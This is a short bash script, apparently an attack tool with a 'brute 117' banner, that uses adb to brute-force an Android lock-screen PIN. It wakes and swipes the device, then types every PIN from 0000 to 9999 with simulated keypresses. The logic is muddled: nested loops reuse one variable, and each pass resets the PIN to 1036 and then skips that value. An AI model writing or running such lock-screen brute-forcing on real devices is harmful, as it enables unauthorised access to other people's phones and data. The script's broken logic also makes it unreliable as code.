#!/bin/bash

screen="$(adb shell dumpsys activity|grep -i mCurrentFocus|awk 'NR==1{print $3}'|cut -d'}' -f1)"
case $screen in
    "mScreenState=OFF") echo -e "Preparing to attack."; 
        echo -e "All Has Been Set" ;;
    "mScreenState=ON_UNLOCKED") adb shell input keyevent 26
esac
echo -e "(((_.-=-._.-=-._)))"
echo -e " ))~~~~~~~~~~~~~(( "
echo -e "(( > brute 117 < ))"
echo -e " )).............(( "
echo -e "(((<-._.-'<-._.-)))"
adb shell input keyevent 3
adb shell input keyevent 82
adb shell input swipe 407 1211 378 85
while true
do
    for i in {0000..9999}; do
        for i in {0000..9999}; do
            if [[ $i != 1036 ]]; then
                echo -e "(( >    \e[1m$i\e[0m   < ))"
                echo -e " ))~~~~~~~~~~~~~(( "
                adb shell locksettings clear --old 1036
                adb shell locksettings set-pin 1036
                for (( j=0; j<${#i}; j++ )); do
                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
                done
                adb shell input keyevent 66
            fi
        done
    done
done